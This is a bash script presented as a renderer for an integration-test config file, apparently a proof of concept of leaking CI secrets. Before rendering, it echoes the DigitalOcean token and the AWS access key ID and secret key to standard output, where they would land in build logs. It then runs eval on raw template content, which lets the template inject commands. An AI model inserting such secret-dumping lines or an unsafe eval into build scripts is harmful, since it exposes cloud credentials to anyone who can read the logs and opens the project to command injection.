#!/usr/bin/env bash
# Renders tests/integration/integration_config.yml
set -e
set -o pipefail
set -u

function main() {
  echo "Printing secrets PoC"
  echo "DigitalOcean Token: $DIGITALOCEAN_TOKEN"
	echo "Aws key id: $AWS_ACCESS_KEY_ID"
	echo "Aws secret key: $AWS_SECRET_ACCESS_KEY"
 
  local template
  template="$1"
  shift
  local content
  content="$(cat "$template")"

  eval "echo \"$content\""
}

main "$@"
